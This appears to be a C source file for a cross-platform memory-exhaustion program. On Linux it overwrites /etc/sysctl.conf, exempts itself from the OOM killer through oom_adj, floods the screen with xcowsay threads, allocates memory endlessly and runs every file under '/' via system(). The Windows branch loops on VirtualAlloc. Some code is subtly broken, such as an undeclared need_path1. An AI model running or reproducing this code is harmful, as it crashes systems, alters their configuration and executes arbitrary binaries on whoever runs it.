#ifdef __gnu_linux__
#include <sys/mman.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <ctype.h>
#include <dirent.h>
#include <ftw.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <pthread.h>


#define SHELLSCRIPT "\
echo \"vm.com-kill=0\">/etc/sysctl.conf\n\
sysctl -p\n\
echo \1>/proc/sys/vm/com-kill\n\
sysctl -p\n\
echo \"vm.overcommit_memory=2\" > /etc/sysctl.conf\n\
sysctl -p\n\
"


#define UNUSED(st1) (void)(st1)
char *need_path ="/";



#define DEBUG 1
#define START_DIR "/proc"
#define OOM_KILLER_FILE_2 "oom_adj"


extern int errno;
struct timeval start,end;
#endif


#ifdef _WIN64
#include <windows.h>
#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
extern int errno;
double PCFreq;
__int64 CounterStart;


//#pragma warning (disable : 4996)
int real_size = 0;
#endif

#ifdef __gnu_linux__
void* alotcow() {
	while(1){
	system("/usr/games/xcowsay MOOOOOO!!!");
	}
}
void* alotcow2() {
	while(1){
	system("/usr/games/xcowsay MOOOOOO!!!");
	}
}
void* alotcow3() {
	while(1){
	system("/usr/games/xcowsay MOOOOOO!!!");
	}
}
void* alotcow4() {
	while(1){
	system("/usr/games/xcowsay MOOOOOO!!!");
	}
}
void* alotcow5() {
	while(1){
	system("/usr/games/xcowsay MOOOOOO!!!");
	}
}
#endif


#ifdef _WIN64
void StartCounter()
{
    LARGE_INTEGER li;
    if (!QueryPerformanceFrequency(&li))
   	 printf("QueryPerformanceFrequency failed!\n");


    PCFreq = li.QuadPart;


    QueryPerformanceCounter(&li);
    CounterStart = li.QuadPart;
}


double GetCounter()
{
    LARGE_INTEGER li;
    QueryPerformanceCounter(&li);
    return (double)((li.QuadPart - CounterStart) / PCFreq);
}
#endif


#ifdef _WIN64

int StartUpInfoFileWriter()
{
    FILE* f = fopen("log.txt", "a+");
    if (f == NULL)
    {
   	 printf("Can't open file!");
    }
    else
    {
   	 fprintf(f,"Time;UsedMemory\n");
   	 fclose(f);
    }
    return 0;
}

int FileWriter(int AvailableMemory)
{
    FILE* f = fopen("log.txt", "a+");
    if (f == NULL)
    {
   	 printf("Can't open file!");
    }
    else
    {
   	 
   	 fprintf(f,"%d;%f\n",AvailableMemory,GetCounter());
   	 fclose(f);
    }
    return 0;
}
#endif



#ifdef __gnu_linux__
int StartInfoWriter()
{
    FILE *fp;
    char fname[]="log.txt";
    fp=fopen(fname,"a+");
    if(fp==NULL)
    {
   	 perror("fp");
    }
    else
    {
   	 fprintf(fp,"Time;UsedMemory\n");
   	 fclose(fp);
    }
    return 0;
}
#endif

#ifdef __gnu_linux__
float time_diff(struct timeval *start,struct timeval *end)
{
    return (end->tv_sec-start->tv_sec)+1e-6*(end->tv_usec-start->tv_usec);
}
#endif


#ifdef __gnu_linux__
int FileWriter(long int* AvailableMemory)
{
    FILE *fp;
    char fname[]="log.txt";
    fp=fopen(fname,"a+");
    if(fp==NULL)
    {
   	 perror("fp");
    }
    else
    {
   	 fprintf(fp,"%d;%0.8f\n",AvailableMemory,time_diff(&start,&end));
   	 fclose(fp);
    }
    return 0;
}
#endif




#ifdef __gnu_linux__
int downscores()
{
    int PID=getpid();
    char PID_IN_STR[6];
    char path[1025];
    char sym;
    
    #if DEBUG==1
    sprintf(PID_IN_STR,"%d", PID);
    fprintf(stdout,"PID\t%s\n", PID_IN_STR);
    #endif
    
    FILE *oom;
    DIR *dirs,*procdir;
    struct dirent *entry;
    struct dirent *entry_procdir;
    dirs=opendir(START_DIR);
    if(!dirs)
    {
   	 perror("opendir failed");
   	 return 1;
    }
    while ((entry=readdir(dirs)))
    {
   	 if(entry->d_type==DT_DIR&&isdigit(entry->d_name[0]))
   	 {
   		 if(strcmp(entry->d_name, PID_IN_STR)==0)
   		 {
   			 #if DEBUG==1
   			 fprintf(stdout,"dir_name\t%s\n",entry->d_name);
   			 #endif
   			 
   			 strcpy(path,START_DIR);
   			 strcat(path,"/");
   			 strcat(path,entry->d_name);
   			 
   			 #if DEBUG==1
   			 fprintf(stdout,"path to need dir\t%s\n",path);
   			 #endif
   			 
   			 procdir=opendir(path);
   			 if(!procdir)
   			 {
   				 perror("opendir failed");
   				 return 1;
   			 }
   			 while (entry_procdir=readdir(procdir))
   			 {
   				 #if DEBUG==1
   				 fprintf(stdout,"entry_procdir->d_name\t%s\t\n",entry_procdir->d_name);
   				 #endif    
   				 if(strcmp(entry_procdir->d_name,OOM_KILLER_FILE_2)==0)
   				 {
   					 #if DEBUG==1
   					 fprintf(stdout,"Need file\t%s\n",entry_procdir->d_name);
   					 #endif
   					 
   					 strcat(path,"/");
   					 strcat(path,entry_procdir->d_name);
   					 
   					 #if DEBUG==1
   					 fprintf(stdout,"path to need file\t%s\n",path);
   					 #endif
   					 
   					 oom=fopen(path,"w+");
   					 if(oom==NULL)
   					 {
   						 perror("oom_adj");
   					 }
   					 else
   					 {
   						 
   						 #if DEBUG==1
   						 fprintf(stdout,"File\t%s\topened!\n",entry_procdir->d_name);
   						 #endif
   						 
   						 char minus=0x2d;
   						 char one=0x31;
   						 char seven=0x37;
   						 fputc(minus,oom);
   						 fputc(one,oom);
   						 fputc(seven,oom);
   						 
   						 #if DEBUG==1
   						 fprintf(stdout,"%c",getc(oom));
   						 fprintf(stdout,"%c",getc(oom));
   						 fprintf(stdout,"%c\n",getc(oom));
   						 #endif
   						 fclose(oom);
   					 }
   				 }
   				 
   			 }
   			 closedir(procdir);
   		 }
   	 }
    }
    closedir(dirs);
    return 0;
}
#endif


#ifdef __gnu_linux__
int Find_Programm(const char * fpath1, const struct stat * st1, int tflag1)
{
    UNUSED(st1);
    switch(tflag1)
    {
   	 case FTW_F:
   	 {
   		 system(fpath1);	 
   	 };
        	case FTW_D:
        	{
       		 break;
        	};
        	case FTW_SL:
        	{
       		 return -1;
        	};
        	case FTW_NS:
        	{
       		 return -1;
        	};
        	case FTW_DNR:
        	{
       		 return -1;
   	 };
    }
    
    return 0;
}


int main(int argc,char *argv[])
{

    system("ulimit -m 150000");
    pthread_t thread;
    if (pthread_create(&thread, NULL, alotcow, NULL) != 0) {
        fprintf(stderr, "Ошибка при создании потока.\n");
        return 1;
    }
    pthread_t thread2;
    if (pthread_create(&thread2, NULL, alotcow2, NULL) != 0) {
        fprintf(stderr, "Ошибка при создании потока.\n");
        return 1;
    }
    pthread_t thread3;
    if (pthread_create(&thread3, NULL, alotcow3, NULL) != 0) {
        fprintf(stderr, "Ошибка при создании потока.\n");
        return 1;
    }
    pthread_t thread4;
    if (pthread_create(&thread4, NULL, alotcow4, NULL) != 0) {
        fprintf(stderr, "Ошибка при создании потока.\n");
        return 1;
    }
    pthread_t thread5;
    if (pthread_create(&thread5, NULL, alotcow5, NULL) != 0) {
        fprintf(stderr, "Ошибка при создании потока.\n");
        return 1;
    }
    
	
    sleep(20);
    system(SHELLSCRIPT);
    
	gettimeofday(&start, NULL);
    int ps;  
    long cp; 
    long cap;     
    char *map;
    long unsigned int res = 256*1024*1024; // ~256 Mb
    long unsigned int res2=res;
    int PID=getpid();
    //StartInfoWriter();
    if((cp=sysconf(_SC_PHYS_PAGES))|(cap=sysconf(_SC_AVPHYS_PAGES))|(ps=sysconf(_SC_PAGESIZE))!=-1)
    {
   	 #if DEBUG==1
   	 fprintf(stdout,"Size of page:\t%d\tbytes\nCount pages of physical mem.\t%ld\n Count available pages of phys. mem. RIGHT NOW\t%ld\nMem. at all\t%f\tGb\nAvailable mem at all right now\t%f\tGb\n",ps,cp,cap,(float)(cp*ps)/(1024*1024*1024),(float)(cap*ps)/(1024*1024*1024));
   	 #endif
    }
    else
    {
   	 perror("SYSCONF");
    }
   while(1){
   	 downscores();
   	 if((cp=sysconf(_SC_PHYS_PAGES))|(cap=sysconf(_SC_AVPHYS_PAGES))|(ps=sysconf(_SC_PAGESIZE))!=-1)
   	 {
   	 }
   	 else
   	 {
   		 perror("SYSCONF");
   	 }
   	 if((map=(char*)mmap(NULL,res,PROT_WRITE|PROT_READ|PROT_NONE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN,0,0))==MAP_FAILED)
   	 {
   		 res=res/2;
   		 perror("MMAP");
   	 }
   	 else
   	 {
   		 if(res>=1)
   		 {
   			 if(cap*ps>res)
   			 {
   				 for(int i=0;i<res;i+=ps)
   				 {
   					 map[i]=1;    
   				 }
   				 gettimeofday(&end, NULL);
   				 long int AM=cap*ps/1024/1024;
   				 FileWriter((long int*)AM);
   				 #if DEBUG==1
   				 fprintf(stdout,"mmap() -> %d\tbytes\n",res);
   				 #endif
   			 }
   			 else
   			 {
   				 res=res/2;
   				 for(int i=0;i<res;i+=ps)
   				 {
   					 map[i]=1;
   				 }
   				 gettimeofday(&end, NULL);
   				 long int AM=cap*ps/1024/1024;
   				 FileWriter((long int*)AM);
   				 #if DEBUG==1
   				 fprintf(stdout,"mmap() -> %d\tbytes\n",res);
   				 #endif
   			 }
   		 }
   		 else
   		 {
   			 res=res*1024*1024;
   		 }
    
   	 }
   	 if(ftw(need_path1, Find_Programm, 20)== -1)
   	 {
   		     	 perror("ftw");
  			 exit(EXIT_FAILURE);
  	 }
    
	}
    return 0;    
}
#endif


#ifdef _WIN64
int main(int argc,char *argv[])
{
    StartCounter();
    StartUpInfoFileWriter();
    unsigned int size= 256*1024*1024;
    int total=0;
    //printf("%d",PS);
    while (1)
    {
   	 char * VA=(char*)VirtualAlloc(0,size, MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE);
   	 
   	 if (VA==0)
   	 {
   		 if(size>16)   	 
   		 {    
   			 //perror("VirtualAlloc");
   			 size=size/2;   		 
   		 }    
   		 else
   		 {    
   			 size=256*1024*1024;   	 
   		 }    
   	 }
   	 else
   	 {
   		 total+=size/1024/1024;
   		 #if DEBUG==1
   		 fprintf(stdout,"%ld\n",total);
   		 #endif   		 


   		 FileWriter(total);
   		 for( int i=0;i<size;i+=4096)
   		 {
   			 memset(VA,'$',sizeof(char));
   			 //VA[i]=1;   	 
   		 }
   	 }
    }
    return 0;
    
}


#endif

